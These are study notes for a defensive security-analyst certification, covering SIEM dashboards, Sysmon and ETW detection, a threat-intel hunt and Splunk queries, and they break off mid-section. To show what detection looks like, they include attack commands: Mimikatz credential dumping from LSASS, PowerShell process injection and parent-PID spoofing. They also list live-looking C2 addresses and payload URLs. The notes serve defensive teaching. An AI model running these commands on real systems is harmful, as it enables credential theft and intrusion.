---
title:       "CDSA Exam"
summary:     "HTB Certified Defensive Security Analyst (HTB CDSA)"
category:    "Hack The Box"
tags:        [cdsa, hack-the-box]
updated:     2026-05-21
---

{% raw %}

**1. Security Monitoring & SIEM Fundamentals**

#### **SIEM\_Visualization\_Failed\_Logons\_All\_Users**

**Objective**

Create a dashboard and visualization to monitor failed logon attempts for all users.

**Steps**

1. **Navigate to the Target System**
  - Access the SIEM tool via `http://[Target IP]:5601`.
  - Go to "Dashboard" from the side navigation.
2. **Delete Existing Dashboard**
  - Remove the "SOC-Alerts" dashboard if present.
3. **Create New Dashboard**
  - Click "Create new dashboard" to start from scratch.
4. **Set Up the Visualization**
  - **Set Date Range**: Use the time picker to select "last 15 years" as the date range, then apply it.
  - **Filter Configuration**
    - Use Event ID `4625` to filter failed logon attempts.
  - **Index Pattern**
    - Set `windows*` as the index pattern to use Windows-related logs.
  - **Search Bar Check**
    - Confirm `user.name.keyword` is in the dataset for accurate aggregation.
  - **Select Visualization Type**
    - Choose the "Table" option for the display.
5. **Configure Table Settings**
  - **Rows Settings**
    - Set up rows to display:
      - **Username** - account attempting logon.
      - **Machine** - reporting host machine (`host.hostname.keyword`).
      - **Count of Events** - metric to show number of attempts.
  - **Metrics**
    - Select "count" to populate the table based on the dataset.
6. **Save the Visualization**
  - Click "Save and return" to add it to the dashboard.

**Refining the Visualization**

1. **Edit the Visualization**
  - Access the previously created visualization and select "Edit lens".
  - **Column Names**
    - Update for clarity as per SOC Manager's suggestion.
  - **Add Logon Type**
    - Include `winlog.logon.type.keyword` field for detailed logon types.
  - **Sort Results**
    - Sort the data within the visualization for better readability.
  - **Exclude Specific Usernames**
    - Filter out usernames like `DESKTOP-DPOESND`, `WIN-OK9BH1BCKSD`, and `WIN-RMMGJA7T9TC`.
  - **Exclude Computer Accounts**
    - Use a KQL query to exclude computers: `NOT user.name: *$ AND winlog.channel.keyword: Security`.
2. **Save Refinements**
  - Finalize and save the visualization with a suitable title.

---

The completed table will now display:

- Usernames, excluding specified computer accounts.
- Machines where failed attempts occurred.
- The count of failed logon attempts over the defined timeframe.

**1. Security Monitoring & SIEM Fundamentals**

---

#### **SIEM\_Visualization\_Failed\_Logons\_Disabled\_Users**

**Objective**

Create a visualization to monitor failed login attempts specifically for disabled users in a Windows environment.

**Steps**

1. **Navigate to the Target System**
  - Access the SIEM tool via `http://[Target IP]:5601`.
  - Open the "Dashboard" by toggling the side navigation and selecting it.
2. **Edit Dashboard**
  - Click the "pencil" or edit icon to modify the dashboard.
  - Click on "Create visualization" to start the process.
3. **Configure Visualization Settings**
  - **Filter Configuration**
    - Set up a filter to focus on event ID `4625`, representing failed logon attempts.
    - Use the `winlog.event_data.SubStatus` field with a value of `0xC0000072` to identify failures due to disabled user logins.
  - **Index Pattern**
    - Specify `windows*` as the index pattern to ensure Windows-related logs are used.
  - **Search Bar Check**
    - Verify the `user.name.keyword` field is present in the dataset to confirm access to accurate data.
  - **Choose Visualization Type**
    - From the drop-down menu, select the "Table" visualization type.
4. **Table Configuration**
  - **Rows Settings**
    - Add "Rows" and include relevant data elements.
    - Configure the table to display:
      - **Disabled User** - the user account associated with the failed attempt.
      - **Machine** - the host machine reporting the event, using the `host.hostname.keyword` field.
      - **Count of Events** - set as "count" under "Metrics" to quantify the failed logon attempts.
5. **Save and Return**
  - Click "Save and return" to add the configured visualization to the dashboard.

---

The completed table will display:

- The disabled user account linked to the failed logon.
- The machine reporting the attempt.
- The count of failed logon attempts over the specified timeframe or dataset.

#### **SIEM\_Visualization\_Successful\_RDP\_Logons\_Service\_Accounts**

**Objective**

Create a visualization to monitor successful RDP logon attempts specifically related to service accounts.

**Steps**

1. **Navigate to the Target System**
  - Access the SIEM tool via `http://[Target IP]:5601`.
  - Open the "Dashboard" from the side navigation.
2. **Edit Dashboard**
  - Click the "pencil" or edit icon to modify the dashboard.
  - Select "Create visualization" to begin.
3. **Configure Visualization Settings**
  - **Filter Configuration**
    - Set up a filter to focus on Event ID `4624` (successful logon attempts).
    - Filter logon type to `RemoteInteractive` using the `winlog.logon.type` field.
  - **Index Pattern**
    - Specify `windows*` as the index pattern to use Windows-related logs.
  - **Search Bar Check**
    - Confirm `user.name.keyword` is in the dataset to ensure field accuracy.
  - **Select Visualization Type**
    - Choose the "Table" option for the display.
4. **Table Configuration**
  - **Rows Settings**
    - Add "Rows" to display:
      - **Service Account** - `user.name` field (filtered for svc-\* for service accounts).
      - **Machine** - reporting host machine (`host.hostname.keyword`).
      - **Initiating IP** - IP of the machine that initiated the logon (`related.ip.keyword`).
      - **Count of Events** - set to "count" to show event occurrences.
  - **Metrics**
    - Select "count" as the metric to populate the table.
5. **KQL Query for Service Accounts**
  - Use `user.name: svc-*` to limit results to service accounts starting with `svc-`.
6. **Save and Return**
  The completed table will display:
  - Click "Save and return" to add the configured visualization to the dashboard.
  - The service account used for the RDP logon.
  - The machine that received the logon.
  - The IP of the initiating machine.
  - The count of successful RDP logon attempts.

#### **SIEM\_Visualization\_User\_Add\_Remove\_Local\_Group**

**Objective**

Create a visualization to monitor user additions or removals from the "Administrators" group from March 5th, 2023 to the present date.

**Steps**

1. **Navigate to the Target System**
  - Access the SIEM tool via `http://[Target IP]:5601`.
  - Open the "Dashboard" from the side navigation.
2. **Edit Dashboard**
  - Click the "pencil" or edit icon to modify the dashboard.
  - Select "Create visualization" to start.
3. **Configure Visualization Settings**
  - **Filter Configuration**
    - Set up filters to focus on Event IDs `4732` (user added to group) and `4733` (user removed from group).
    - Filter events to only include changes involving the "Administrators" group.
  - **Index Pattern**
    - Specify `windows*` as the index pattern to use Windows-related logs.
  - **Search Bar Check**
    - Confirm `user.name.keyword` is present to ensure access to relevant data.
  - **Select Visualization Type**
    - Choose the "Table" option for the display.
4. **Table Configuration**
  - **Rows Settings**
    - Add "Rows" to display:
      - **User Involved** - account added or removed (`winlog.event_data.MemberSid.keyword`).
      - **Group Targeted** - confirm it’s the "Administrators" group (`group.name.keyword`).
      - **Action Taken** - whether the user was added or removed (`event.action.keyword`).
      - **Machine Name** - the host reporting the change (`host.name.keyword`).
      - **Count of Events** - set to "count" for the number of occurrences.
  - **Metrics**
    - Select "count" as the metric to populate the table.
5. **Set Date Range**
  - Apply a date filter from March 5th, 2023 to the current date to narrow the data scope.
6. **Save and Return**
  - Click "Save and return" to add the configured visualization to the dashboard.

---

The completed table will display:

- The user added or removed from the group.
- The group, ensuring it is the "Administrators" group.
- The action taken (added or removed).
- The machine where the action occurred.
- The count of additions or removals within the specified timeframe.

**2. Windows Event Logs & Finding Evil**

#### **Analyzing\_Evil\_With\_Sysmon\_and\_Event\_Logs**

**Overview**

Effective cybersecurity involves identifying and analyzing malicious events. Using event logs and Sysmon enhances detection of suspicious activity, with Sysmon providing detailed monitoring beyond standard Security Event logs.

---

**Sysmon Basics**

Sysmon (System Monitor) is a Windows tool for logging system activity beyond what standard event logs provide. Its main components include:

- **Windows Service**: Monitors system activities.
- **Device Driver**: Captures data for logging.
- **Event Log**: Displays captured activity.

Sysmon offers **unique event IDs** for various types of activity:

- **Event ID 1**: Process Creation
- **Event ID 3**: Network Connection

Sysmon configuration is controlled through an **XML file** that allows inclusion/exclusion of events based on attributes such as process names or IP addresses. Recommended configurations:

- [SwiftOnSecurity Sysmon Config](https://github.com/SwiftOnSecurity/sysmon-config)
- [Olaf Hartong Sysmon Modular Config](https://github.com/olafhartong/sysmon-modular)

**Installation** (requires admin):

```
C:\\Tools\\Sysmon> sysmon.exe -i -accepteula -h md5,sha256,imphash -l -n
```

**Applying a Custom Config**:

```
C:\\Tools\\Sysmon> sysmon.exe -c filename.xml
```

---

**Detection Example 1: DLL Hijacking Detection**

Sysmon Event ID 7 (Module Load) can be used to detect DLL hijacking. Here’s an approach to detect a hijack:

1. **Modify Sysmon Config**: Use the `sysmonconfig-export.xml` file and ensure module load events are not excluded.
2. **Monitoring**: Event Viewer -> Applications and Services -> Microsoft -> Windows -> Sysmon.

**Indicators of Compromise (IOCs)**

- **calc.exe** in writable directory: An unusual directory for a system executable.
- **WININET.dll** loaded outside System32: Indicates hijacking of a trusted DLL.
- **DLL signing status**: Microsoft-signed DLLs being replaced with unsigned versions.

---

**Detection Example 2: Unmanaged PowerShell/C# Injection Detection**

Injection of PowerShell or C# into unmanaged processes can indicate malicious behavior. Observing unusual managed code running within unmanaged processes:

1. **Identify .NET Runtime**: Detect clr.dll or clrjit.dll in processes that don’t normally use C#.
2. **Tools**: Process Hacker can be used to view process types and loaded modules.

**Example of Injection:**

```
powershell -ep bypass
Import-Module .\\Invoke-PSInject.ps1
Invoke-PSInject -ProcId [Process ID] -PoshCode "Write-Host 'Hello, World!'"
```

Sysmon Event ID 7 can reveal DLLs like clr.dll being loaded by unusual processes.

---

**Detection Example 3: Credential Dumping Detection (e.g., Mimikatz)**

Credential dumping (e.g., with Mimikatz) often targets LSASS (Local Security Authority Subsystem Service). Mimikatz command `sekurlsa::logonpasswords` dumps credentials from LSASS.

**Detection Method**

- **Sysmon Event ID 10 (Process Access)**: Monitors access to LSASS.
- **Indicators**:
  - Random processes accessing LSASS.
  - SourceUser different from TargetUser (e.g., "waldo" accessing SYSTEM's LSASS).
  - Requests for SeDebugPrivileges.

**Sample Mimikatz Execution**

```
C:\\Tools\\Mimikatz> mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```

These detections using Sysmon and event logs provide telemetry for identifying suspicious behavior, though they should be combined with other cybersecurity tools for robust monitoring.

#### **Event\_Tracing\_for\_Windows\_ETW**

**Overview**

Event Tracing for Windows (ETW) is a high-performance event tracing tool in Windows, enabling comprehensive logging from both user-mode applications and kernel-mode device drivers. ETW facilitates the dynamic generation, collection, and analysis of system events, providing telemetry that spans system calls, process creation/termination, network activity, file/registry changes, and more. ETW’s data offers invaluable context for detecting anomalies, investigating security incidents, and performing forensic analysis.

---

**Key Components of ETW**

1. **Controllers**: Responsible for managing ETW sessions, including starting, stopping, and enabling providers.
  - Example: **logman.exe** is a common controller for ETW activities.
2. **Providers**: Generate specific types of events within ETW, based on four primary types:
  - **MOF Providers**: Use Managed Object Format for flexible event generation.
  - **WPP Providers**: Leverage source code annotations for kernel-mode tracing.
  - **Manifest-based Providers**: Use XML manifests to define event structure.
  - **TraceLogging Providers**: Simplified providers for recent Windows versions.
3. **Consumers**: Subscribe to and process specific ETW events, often saved in .ETL files for long-term storage.
4. **Channels**: Logical containers that organize events by characteristics, allowing consumers to selectively subscribe.
5. **ETL Files**: Event Trace Log (ETL) files are durable storage formats for offline analysis, archiving, and investigations.

---

**Interacting with ETW**

**Managing ETW Sessions**

- **Logman Utility**: Used to create, start, stop, and query ETW sessions.
  ```
  C:\\Tools> logman.exe query -ets
  ```
  This command provides details about active ETW sessions.
- **Querying Session Details**: Inspecting session details (Name, Log Size, Providers) can offer incident responders critical context for investigations.
  ```
  C:\\Tools> logman.exe query "EventLog-System" -ets
  ```
- **Provider Listing**: List all available providers on the system.
  ```
  C:\\Tools> logman.exe query providers
  ```

**GUI Alternatives**

- **Performance Monitor**: Visualizes active ETW sessions, with modification options for adding/removing providers.
- **EtwExplorer**: Provides metadata insights into ETW providers.

---

**Useful ETW Providers**

- **Microsoft-Windows-Kernel-Process**: Monitors process activities like injection or hollowing.
- **Microsoft-Windows-Kernel-File**: Detects file modifications related to exfiltration or ransomware.
- **Microsoft-Windows-Kernel-Network**: Captures network activities to detect unauthorized connections.
- **Microsoft-Windows-SMBClient/SMBServer**: Tracks SMB traffic, potentially useful for detecting lateral movement.
- **Microsoft-Windows-DotNETRuntime**: Monitors .NET runtime for suspicious application executions.
- **Microsoft-Windows-PowerShell**: Essential for tracking PowerShell execution and command logging.
- **Microsoft-Windows-TerminalServices-LocalSessionManager**: Observes RDP activity, useful for detecting remote desktop intrusions.

---

**Restricted Providers**

**Microsoft-Windows-Threat-Intelligence**: A high-value, restricted provider requiring privileged access (PPL - Protected Process Light) for telemetry on sophisticated threats. This provider is critical in DFIR operations and may reveal granular threat data, origins, interactions, and impacts. Privileged access enables capturing detailed logs of advanced threats, though some workarounds exist.

---

ETW is an advanced telemetry source with minimal system performance impact, suitable for real-time monitoring and continuous security assessment. Future sections will cover leveraging ETW for attack detection beyond Sysmon’s capabilities.

---

**References**

- [ETW Primer](https://nasbench.medium.com/a-primer-on-event-tracing-for-windows-etw-997725c082bf)
- [Comprehensive ETW Guide](https://bmcder.com/blog/a-begginers-all-inclusive-guide-to-etw)

#### **Get-WinEvent**

Understanding the importance of mass analysis of Windows Event Logs and Sysmon logs is pivotal in the realm of cybersecurity, especially in Incident Response (IR) and threat hunting scenarios. These logs hold invaluable information about the state of your systems, user activities, potential threats, system changes, and troubleshooting information.

**Using Get-WinEvent**

The `Get-WinEvent` cmdlet is a powerful tool in PowerShell for querying Windows Event logs en masse. It allows the retrieval of different types of event logs, including classic logs (like System and Application logs) and Event Tracing for Windows (ETW) logs.

**Listing Available Logs**

To retrieve a list of all logs and display key properties:

```
Get-WinEvent -ListLog * | Select-Object LogName, RecordCount, IsClassicLog, IsEnabled, LogMode, LogType | Format-Table -AutoSize
```

**Output Example**

| **LogName** | **RecordCount** | **IsClassicLog** | **IsEnabled** | **LogMode** | **LogType** |
|---|---|---|---|---|---|
| Windows PowerShell | 2916 | True | True | Circular | Administrative |
| System | 1786 | True | True | Circular | Administrative |

**Listing Event Providers**

Event providers are sources of events in the logs. To list providers and their associated logs:

```
Get-WinEvent -ListProvider * | Format-Table -AutoSize
```

**Retrieving Specific Events**

**System Log Events**

Retrieve the first 50 events from the System log:

```
Get-WinEvent -LogName 'System' -MaxEvents 50 | Select-Object TimeCreated, ID, ProviderName, LevelDisplayName, Message | Format-Table -AutoSize
```

**WinRM Operational Log**

Retrieve events from `Microsoft-Windows-WinRM/Operational`:

```
Get-WinEvent -LogName 'Microsoft-Windows-WinRM/Operational' -MaxEvents 30 | Select-Object TimeCreated, ID, ProviderName, LevelDisplayName, Message | Format-Table -AutoSize
```

**Filtering by Date Range**

To filter events by date, specify a range:

```
$startDate = (Get-Date -Year 2023 -Month 5 -Day 28).Date
$endDate   = (Get-Date -Year 2023 -Month 6 -Day 3).Date
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=1,3; StartTime=$startDate; EndTime=$endDate} | Select-Object TimeCreated, ID, ProviderName, LevelDisplayName, Message | Format-Table -AutoSize
```

**Filtering by Event ID and Properties**

Retrieve Sysmon event IDs 1 and 3:

```
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=1,3} | Select-Object TimeCreated, ID, ProviderName, LevelDisplayName, Message | Format-Table -AutoSize
```

**Filtering with XML Content**

Detect specific DLL loads (`mscoree.dll` and `clr.dll`) using XML:

```
$Query = @"
<QueryList>
    <Query Id="0">
        <Select Path="Microsoft-Windows-Sysmon/Operational">*[System[(EventID=7)]] and *[EventData[Data='mscoree.dll']] or *[EventData[Data='clr.dll']]</Select>
    </Query>
</QueryList>
"@
Get-WinEvent -FilterXml $Query | ForEach-Object {Write-Host $_.Message `n}
```

**Detecting Specific Network Connections**

An example command to check for network connections to a specific IP:

```
Get-WinEvent -LogName 'Microsoft-Windows-Sysmon/Operational' -FilterXPath "*[System[EventID=3] and EventData[Data[@Name='DestinationIp']='52.113.194.132']]"
```

**Viewing All Properties of a Sysmon Event**

To get a detailed view of all properties in a Sysmon event:

```
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=1} -MaxEvents 1 | Select-Object -Property *
```

**Searching for Encoded Commands**

Detects events where encoded commands (`-enc`) are used, often for obfuscating scripts:

```
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=1} | Where-Object {$_.Properties[21].Value -like "*-enc*"} | Format-List
```

These examples demonstrate using `Get-WinEvent` for efficient log analysis, including filtering, XML queries, and detailed event inspection.

#### **Tapping\_Into\_ETW**

**Overview**

Event Tracing for Windows (ETW) offers a rich data source for detecting and analyzing suspicious activities, with detailed visibility into system events. Below are some detection scenarios that utilize ETW's capabilities for enhanced security insights.

---

**Detection Example 1: Detecting Strange Parent-Child Relationships**

Unusual parent-child process relationships, such as "calc.exe" spawning "cmd.exe", can indicate malicious activity. Observing such anomalies helps in identifying possible threats. **Process Hacker** provides a way to explore these relationships within Windows.

**Attack Simulation - Parent PID Spoofing**

- Attackers can simulate a strange parent-child relationship using Parent PID Spoofing.
- Example command:
  ```
  PS C:\\Tools\\psgetsystem> powershell -ep bypass
  Import-Module .\\psgetsys.ps1
  [MyProcess]::CreateProcessFromParent([Process ID], "C:\\Windows\\System32\\cmd.exe", "")
  ```

Using ETW with **SilkETW** can enhance detection by providing accurate telemetry beyond what Sysmon logs alone may capture.

**Using SilkETW**

Run SilkETW to capture accurate process relationships:

```
c:\\Tools\\SilkETW_SilkService_v8\\v8\\SilkETW>SilkETW.exe -t user -pn Microsoft-Windows-Kernel-Process -ot file -p C:\\windows\\temp\\etw.json
```

---

**Detection Example 2: Detecting Malicious .NET Assembly Loading**

Threat actors increasingly use .NET assemblies loaded directly in memory, bypassing disk-based detection. Known as "Bring Your Own Land" (BYOL), this tactic leverages the .NET framework pre-installed on Windows.

**Attack Simulation - Malicious .NET Assembly Load**

- Executing a .NET assembly like **Seatbelt** from memory loads .NET-related DLLs (clr.dll, mscoree.dll).
- Sysmon Event ID 7 can track these DLL loads, but Sysmon alone may not capture all assembly details.

**Using ETW with SilkETW for Deeper Insights**

To monitor .NET runtime activity, capture events from the **Microsoft-Windows-DotNETRuntime** provider with SilkETW:

```
c:\\Tools\\SilkETW_SilkService_v8\\v8\\SilkETW>SilkETW.exe -t user -pn Microsoft-Windows-DotNETRuntime -uk 0x2038 -ot file -p C:\\windows\\temp\\etw.json
```

**Selected Keywords in Use**:

- **JitKeyword**: Tracks Just-In-Time (JIT) compilation events.
- **InteropKeyword**: Logs managed-to-unmanaged code interactions.
- **LoaderKeyword**: Monitors assembly loading activities.
- **NGenKeyword**: Captures precompiled .NET assembly operations.

These keywords provide focused telemetry on .NET activity, aiding in the detection of in-memory .NET execution, which traditional logs might overlook.

---

Leveraging ETW and targeted providers like **Microsoft-Windows-Kernel-Process** and **Microsoft-Windows-DotNETRuntime** enables security teams to detect and respond to advanced threats effectively, including unusual process relationships and in-memory .NET assembly loads.

---

**References**

- [SilkETW blog post on .NET-based malware detection](https://nasbench.medium.com/a-primer-on-event-tracing-for-windows-etw-997725c082bf)

#### **Windows\_Event\_Log\_Components\_and\_Event\_IDs**

**Overview**

Each Windows Event Log entry, termed as an "Event," contains the following primary components:

- **Log Name**: The name of the event log (e.g., Application, System, Security).
- **Source**: The software that generated the event.
- **Event ID**: A unique identifier for the event.
- **Task Category**: Describes the purpose or category of the event.
- **Level**: Indicates the severity (Information, Warning, Error, Critical, Verbose).
- **Keywords**: Flags that categorize events, like "Audit Success" or "Audit Failure" for Security logs.
- **User**: The account that was logged in when the event occurred.
- **OpCode**: Identifies the specific operation reported.
- **Logged**: Timestamp for when the event was logged.
- **Computer**: Name of the computer where the event took place.
- **XML Data**: XML format of the event data, containing all above fields and additional details.

The **Keywords** field is particularly useful for filtering and efficiently managing logs, allowing refined searches for specific event types.

---

**Key Windows System Logs**

1. **Event ID 1074**: System Shutdown/Restart - Logs when and why the system was shut down or restarted. Abnormal shutdowns can indicate potential malware or unauthorized access.
2. **Event ID 6005**: Event Log Service Start - Marks when the Event Log Service started, often at system boot.
3. **Event ID 6006**: Event Log Service Stop - Indicates Event Log Service stop, typically seen during shutdown.
4. **Event ID 6013**: Windows Uptime - Logs uptime in seconds; unexpected reboots may signal intrusion.
5. **Event ID 7040**: Service Status Change - Logs changes in a service’s startup type; unexpected changes could indicate tampering.

---

**Key Windows Security Logs**

1. **Event ID 1102**: Audit Log Cleared - Often associated with intrusion attempts.
2. **Event ID 1116**: Antivirus Malware Detection - Indicates when malware is detected; a rise may suggest an active infection.
3. **Event ID 1118**: Antivirus Remediation Start - Marks the start of malware remediation.
4. **Event ID 1119**: Antivirus Remediation Success - Logs successful malware removal.
5. **Event ID 1120**: Antivirus Remediation Failure - Signifies failed malware removal attempts.
6. **Event ID 4624**: Successful Logon - Records user logins; unusual logins may indicate security risks.
7. **Event ID 4625**: Failed Logon - Failed login attempts, indicating potential brute-force attacks.
8. **Event ID 4648**: Logon with Explicit Credentials - Tracks logons with specific credentials, useful for detecting lateral movement.
9. **Event ID 4656**: Object Handle Request - Logs requests for object handles, aiding in access control monitoring.
10. **Event ID 4672**: Special Privileges Assigned - Super user privileges granted; monitors privilege usage.
11. **Event ID 4698**: Scheduled Task Created - Monitors task creation, often a persistence technique for malware.
12. **Event ID 4700 & 4701**: Scheduled Task Enabled/Disabled - Tracks task status changes, often used by attackers.
13. **Event ID 4702**: Scheduled Task Updated - Logs task updates, potential indicator of malicious changes.
14. **Event ID 4719**: System Audit Policy Change - Records changes to audit policy, potentially covering tracks.
15. **Event ID 4738**: User Account Changed - Logs user account modifications, useful for detecting unauthorized changes.
16. **Event ID 4771**: Kerberos Pre-authentication Failed - Similar to failed logon, specific to Kerberos; may indicate brute force.
17. **Event ID 4776**: Domain Controller Credential Validation - Tracks credential validation attempts by the domain controller.
18. **Event ID 5001**: Antivirus Real-time Protection Configuration Change - Monitors changes in real-time protection settings.
19. **Event ID 5140**: Network Share Accessed - Critical for monitoring unauthorized network access.
20. **Event ID 5142**: Network Share Created - Logs new network shares, potential for data exfiltration or malware spread.
21. **Event ID 5145**: Network Share Access Check - Tracks attempts to access network shares.
22. **Event ID 5157**: Windows Filtering Platform Connection Blocked - Monitors blocked network connections.
23. **Event ID 7045**: Service Installed - Unknown services may suggest malware installation.

---

Monitoring these logs can help identify unauthorized access, potential intrusions, and configuration changes that may signify malicious activity or policy violations.

**3. Introduction to Threat Hunting & Hunting With Elastic**

#### **Stuxbot\_Threat\_Intel\_Report**

**Summary**

The "Stuxbot" cybercrime collective has initiated a broad phishing campaign, primarily targeting Microsoft Windows users without any specific targeting strategy. Their objective appears to be espionage, aiming for system control and escalation rather than financial gain.

- **Platforms in Crosshairs:** Microsoft Windows
- **Threatened Entities:** Windows Users
- **Potential Impact:** Complete computer takeover / Domain escalation
- **Risk Level:** Critical

**Attack Tactics and Techniques**

Stuxbot utilizes opportunistic phishing for initial access, leveraging breached email databases and publicly available data. The group has a modular Remote Access Tool (RAT) for espionage and maintains persistence with disk-based EXE files.

**Lifecycle Overview**

1. **Initial Breach**: Phishing emails with links to OneNote files containing a malicious batch file.
2. **RAT Characteristics**: The modular RAT includes screen capture, Mimikatz, and interactive CMD tools.
3. **Persistence**: EXE files deployed on the disk.
4. **Lateral Movement**: Uses Microsoft-signed PsExec and WinRM for internal propagation.

**Indicators of Compromise (IOCs)**

**OneNote File**:

- `https://transfer.sh/get/kNxU7/invoice.one`
- `https://mega.io/dl9o1Dz/invoice.one`

**Staging Entity (PowerShell Script)**:

- `https://pastebin.com/raw/AvHtdKb2`
- `https://pastebin.com/raw/gj58DKz`

**C&C Nodes**:

- `91.90.213.14:443`
- `103.248.70.64:443`
- `141.98.6.59:443`

**SHA256 Hashes**:

- `226A723FFB4A91D9950A8B266167C5B354AB0DB1DC225578494917FE53867EF2`
- `C346077DAD0342592DB753FE2AB36D2F9F1C76E55CF8556FE5CDA92897E99C7E`
- `018D37CBD3878258C29DB3BC3F2988B6AE688843801B9ABC28E6151141AB66D4`

**Hunting For Stuxbot With The Elastic Stack**

The hunt for Stuxbot utilizes the Elastic Stack, with logs from multiple sources, including Windows, Sysmon, PowerShell, and Zeek.

**Available Data**

- **Windows audit logs** under `windows*`
- **Sysmon logs** under `windows*`
- **PowerShell logs** under `windows*`
- **Zeek logs** under `zeek*`

Our search covers logs dating back to March 2023, containing approximately 118,975 entries in Windows logs and 332,261 in Zeek logs.

**Environment Overview**

The company setup includes around 200 employees with primary use of Office applications, Gmail for email, and Microsoft Edge for browsing. TeamViewer is used for remote support, and Active Directory manages devices.

**Hunting Activities**

1. **Invoice File Download Detection**
  - Query: `event.code:15 AND file.name:*invoice.one`
  - Result: Identified "invoice.one" file download by user Bob on 26th March 2023 at 22:05:47.
2. **File Execution Detection**
  - Query: `event.code:11 AND file.name:invoice.one*`
  - Hostname: `WS001` with IP `192.168.28.130`.
  - Further checks reveal `cmd.exe` initiated the execution of "invoice.bat" and PowerShell from Pastebin.
3. **Network Activity Review**
  - Query: `source.ip:192.168.28.130 AND dns.question.name:*`
  - Findings: File download from `file.io` verified with DNS and IP matches.
4. **Command Execution Tracing**
  - OneNote accessed "invoice.one" file and initiated `cmd.exe`.
  - PowerShell script download from Pastebin was detected with suspicious arguments.
5. **Persistence Mechanism Check**
  - Query: `process.name:"default.exe"`
  - Findings: "default.exe" initiated DNS resolutions and network connections consistent with C2 behavior.
6. **Further Lateral Movement Detection**
  - "SharpHound.exe" used for Active Directory reconnaissance on both `WS001` and `PKI`.
  - `svc-sql1` account credentials likely compromised.

**Conclusion and Next Steps**

Stuxbot’s activities have been mapped through multiple stages from initial access to lateral movement and persistence. The compromised `svc-sql1` account suggests critical exposure within the organization. Immediate steps for containment and further analysis are recommended to mitigate ongoing risks.

**4. Understanding Log Sources & Investigating with Splunk**

#### **Core\_SPL\_Commands**

**Basic Searching**

Example: `search index="main" "UNKNOWN"`

**Boolean and Comparison Operators**

Example: `index="main" EventCode!=1`

**Fields Command**

Exclude a field from results: `index="main" sourcetype="WinEventLog:Sysmon" EventCode=1 | fields - User`

**Table Command**

Present results in a table: `index="main" sourcetype="WinEventLog:Sysmon" EventCode=1 | table _time, host, Image`

**Rename Command**

Rename fields in results: `index="main" sourcetype="WinEventLog:Sysmon" EventCode=1 | rename Image as Process`

**Dedup Command**

Remove duplicate events: `index="main" sourcetype="WinEventLog:Sysmon" EventCode=1 | dedup Image`

**Sort Command**

Sort results: `index="main" sourcetype="WinEventLog:Sysmon" EventCode=1 | sort - _time`

**Stats Command**

Run statistical operations: `index="main" sourcetype="WinEventLog:Sysmon" EventCode=3 | stats count by _time, Image`

**Chart Command**

Create visualizations: `index="main" sourcetype="WinEventLog:Sysmon" EventCode=3 | chart count by _time, Image`

**Eval Command**

Create/redefine fields: `index="main" sourcetype="WinEventLog:Sysmon" EventCode=1 | eval Process_Path=lower(Image)`

**Rex Command**

Extract fields with regex: `index="main" EventCode=4662 | rex max_match=0 "[^%](?<guid>{.*})" | table guid`

**Lookup Command**

Enrich data with external sources.

**Example using**`malware_lookup.csv`

```
index="main" sourcetype="WinEventLog:Sysmon" EventCode=1 | rex field=Image "(?P<filename>[^\\\\]+)$" | eval filename=lower(filename) | lookup malware_lookup.csv filename OUTPUTNEW is_malware | table filename, is_malware
```

**Inputlookup Command**

Retrieve data from a lookup file: `| inputlookup malware_lookup.csv`

**Time Range Filter**

Limit searches to specific times: `index="main" earliest=-7d EventCode!=1`

**Transaction Command**

Group related events: `index="main" sourcetype="WinEventLog:Sysmon" (EventCode=1 OR EventCode=3) | transaction Image startswith=eval(EventCode=1) endswith=eval(EventCode=3) maxspan=1m | table Image | dedup Image`

**Subsearches**

Nest searches: `index="main" sourcetype="WinEventLog:Sysmon" EventCode=1 NOT [ search index="main" sourcetype="WinEventLog:Sysmon" EventCode=1 | top limit=100 Image | fields Image ] | table _time, Image, CommandLine, User, ComputerName`

**Data and Field Identification**

- **Use SPL Commands**: To understand available data and fields.
  - `| eventcount summarize=false index=* | table index`
  - `| metadata type=sourcetypes`
  - `sourcetype="WinEventLog:Security" | table _raw`
- **Data Models**: Structure and understand data.
- **Pivot**: Interactive way to explore data without SPL queries.

Refer to [Splunk Documentation](https://docs.splunk.com/Documentation/SCS/current/SearchReference/Introduction) for more.

#### **Detecting\_Attacker\_Behavior\_With\_Analytics**

In threat detection, anomaly-based detection models help identify unusual patterns by profiling typical behavior and flagging deviations. Splunk's analytics-based approach often uses statistical commands like `streamstats` to establish baselines, allowing us to detect unusual activity that may indicate an intrusion.

**Example 1: Detecting Anomalous Network Connections with**`streamstats`

This example monitors network connections by process, alerting on processes that exceed the expected frequency of connections.

```
index="main" sourcetype="WinEventLog:Sysmon" EventCode=3 | bin _time span=1h | stats count as NetworkConnections by _time, Image | streamstats time_window=24h avg(NetworkConnections) as avg stdev(NetworkConnections) as stdev by Image | eval isOutlier=if(NetworkConnections > (avg + (0.5*stdev)), 1, 0) | search isOutlier=1
```

**Explanation:**

- `streamstats` calculates a rolling average and standard deviation of network connections over 24 hours.
- `isOutlier` flags processes whose network connections exceed 0.5 standard deviations above the average, signaling potential command-and-control activity.

**Example 2: Detecting Abnormally Long Commands**

Attackers may use long command lines to evade detection. This query identifies unusually lengthy commands.

```
index="main" sourcetype="WinEventLog:Sysmon" Image=*cmd.exe | eval len=len(CommandLine) | table User, len, CommandLine | sort - len
```

After examining the output, filtering out benign activity refines the results:

```
index="main" sourcetype="WinEventLog:Sysmon" Image=*cmd.exe ParentImage!="*msiexec.exe" ParentImage!="*explorer.exe" | eval len=len(CommandLine) | table User, len, CommandLine | sort - len
```

**Example 3: Detecting Unusual cmd.exe Activity by User**

Monitoring `cmd.exe` use can help flag suspicious behavior:

```
index="main" EventCode=1 (CommandLine="*cmd.exe*") | bucket _time span=1h | stats count as cmdCount by _time User CommandLine | eventstats avg(cmdCount) as avg stdev(cmdCount) as stdev | eval isOutlier=if(cmdCount > avg+1.5*stdev, 1, 0) | search isOutlier=1
```

**Example 4: Detecting Processes Loading Many DLLs Rapidly**

Malware may load multiple DLLs quickly. This query identifies such behavior:

```
